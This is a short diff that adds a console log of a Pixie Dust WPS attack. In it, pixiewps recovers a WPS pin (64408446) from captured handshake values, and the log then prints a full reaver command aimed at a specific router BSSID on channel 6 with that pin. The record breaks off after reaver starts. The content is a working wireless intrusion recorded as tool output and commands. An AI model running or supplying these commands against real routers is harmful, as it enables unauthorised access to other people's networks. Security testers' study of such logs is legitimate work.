@@ -1,0 +1,16 @@
++] Running pixiewps with the information, wait ...
+[Pixie-Dust]  
+[Pixie-Dust]   Pixiewps 1.2
+[Pixie-Dust]  
+[Pixie-Dust]   [*] Mode:       1 (RT/MT)
+[Pixie-Dust]   [*] PSK1:       be:b7:f4:5b:36:d9:f1:d4:17:ae:c5:99:c5:93:b5:6e
+[Pixie-Dust]   [*] PSK2:       34:b7:b2:06:4f:90:7e:93:ed:9a:45:36:41:e0:42:99
+[Pixie-Dust]   [*] E-S1:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+[Pixie-Dust]   [*] E-S2:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+[Pixie-Dust]   [+] WPS pin:    64408446
+[Pixie-Dust]
+[+] Running reaver with the correct pin, wait ...
+[+] Cmd : reaver -i wlan1mon -b C8:6C:87:62:47:8C -c 6 -s y -vv -p 64408446
+[Reaver Test] [+] BSSID: C8:6C:87:62:47:8C
+[Reaver Test] [+] Channel: 6
+            
